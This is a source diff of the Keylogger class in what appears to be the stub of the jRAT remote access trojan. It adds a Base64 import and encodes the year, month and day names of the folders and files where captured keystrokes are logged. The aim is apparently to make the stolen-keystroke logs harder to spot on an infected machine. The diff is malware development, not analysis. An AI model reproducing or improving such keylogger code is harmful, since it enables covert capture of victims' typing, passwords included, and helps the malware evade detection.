@@ -8,6 +8,7 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 import pro.jrat.plugin.stub.activities.Activities;
 import pro.jrat.plugin.stub.activities.Key;
+import pro.jrat.plugin.stub.codec.Base64;
 
 @SuppressWarnings("deprecation")
 public class Keylogger implements NativeKeyListener {
@@ -41,7 +42,7 @@ public class Keylogger implements NativeKeyListener {
 	public static File getTodaysFile() {		
 		Date date = new Date();
 		
-		File day = new File(getMonthFolder(), (date.getDate()) + ".log");
+		File day = new File(getMonthFolder(), Base64.encode((date.getDate()) + ".log"));
 		
 		return day;
 	}
@@ -49,7 +50,7 @@ public class Keylogger implements NativeKeyListener {
 	public static File getMonthFolder() {
 		Date date = new Date();
 
-		File month = new File(getYearFolder(), (date.getMonth() + 1) + "");
+		File month = new File(getYearFolder(), Base64.encode((date.getMonth() + 1) + ""));
 		month.mkdirs();
 			
 		return month;
@@ -58,7 +59,7 @@ public class Keylogger implements NativeKeyListener {
 	public static File getYearFolder() {
 		Date date = new Date();
 
-		File year = new File(Keylogger.getLogsRoot(), (date.getYear() + 1900) + "");
+		File year = new File(Keylogger.getLogsRoot(), Base64.encode((date.getYear() + 1900) + ""));
 		year.mkdirs();
 		
 		return year;
